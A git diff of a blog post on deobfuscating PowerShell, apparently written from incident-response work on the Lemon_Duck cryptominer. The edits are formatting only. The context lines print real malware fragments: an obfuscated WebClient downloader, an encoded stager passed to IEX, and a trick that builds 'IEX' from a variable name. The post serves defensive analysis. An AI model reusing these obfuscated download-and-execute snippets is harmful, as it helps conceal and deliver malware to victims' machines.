@@ -17,9 +17,11 @@ article_header:
 cover: //assets/images/powershell-deobfuscation/powershell-deobfuscation_cover.jpg
 ---
 
-A lot of the time when working with malware or when investigating an incident, you may encounter PowerShell executing obfuscated commands which may look like gibberish. These commands are usually obfuscated to make it harder for the analyst to understand, as well as making it harder for detection solutions to detect them.
-
+A lot of the time when working with malware or when investigating an incident, you may encounter PowerShell executing obfuscated commands which may look like gibberish.
 <!--more-->
+
+These commands are usually obfuscated to make it harder for the analyst to understand, as well as making it harder for detection solutions to detect them.
+
 
 Knowing how to deobfuscate PowerShell is a very handy and time-saving skill. In this post, we'll take a look at PowerShell scripts from the Lemon_Duck cryptominer as an example.
 
@@ -45,7 +47,7 @@ In a couple of my previous IR engagements, I encountered the Lemon_Duck cryptomi
 ### Scheduled Task: Downloader
 
 The first script was found in a scheduled task.
-```PowerShell
+```powershell
 function a($u)
 {
 $d=(Ne`w-Obj`ect Net.WebC`lient)."DownloadData"($u);
@@ -85,7 +87,7 @@ Sending that request gets us a file: a.jsp. The file initially contains the obfu
 
 ### a.jsp: Stager
 
-```PowerShell
+```powershell
 rAAM2XSdp7kIqh7eCPQSEm7vY2MARGRPfF2wIRvMjHdxB/zQFAP1Vw/CRHC3bjz9wErpENVn0y/hh7buezTN4CuFK3/re6FtHnEc4sSy3EL0dhj8X4rD/X/jBYKgziJxRx4bOGvWMXQWoWitlAKQAvlZIMhcy3IhPf5GZza6cF0=
 I`EX $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$('edbd07601c499625262f6dca7b7f......'-split'(..)'|?{$_}|%{[convert]::ToUInt32($_,16)}))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();
 ```
@@ -115,7 +117,7 @@ As we did previously, we can now replace the `IEX` with `Out-File a_deobf2.ps1` 
 {: style="text-align:center"}
 ![](/assets/images/powershell-deobfuscation/ajspDeobf2.gif)
 
-Again, and like every time, the first thing we look for is the `IEX`. There is an explicit `IEX` string in the script, but it is inside a string (line 418) so it won't execute. So, let's take a look at the start of the script. We find this part ` ((gEt-VARiABLe '*mdr*').NAme[3,11,2]-joIn'')` which has the rest of the script in it.
+Again, and like every time, the first thing we look for is the `IEX`. There is an explicit `IEX` string in the script, but it is inside a string (line 418) so it won't execute. So, let's take a look at the start of the script. We find this part `((gEt-VARiABLe '*mdr*').NAme[3,11,2]-joIn'')` which has the rest of the script in it.
 
 If we execute that selection alone, we get `IEX`. This is because `(gEt-VARiABLe '*mdr*').NAme` returns the string MaximumDriveCount. and indices 3, 11, and 2 map to i, e, and x respectively.
 
@@ -308,6 +310,7 @@ On further analysis, we found out that the server requires the following conditi
 		- Takes a file path
 		- Executes the file using cmd.exe
 - Here’s a more clear version of these functions:
+
 ```powershell
 function stp($gra){
 	write-host $gra
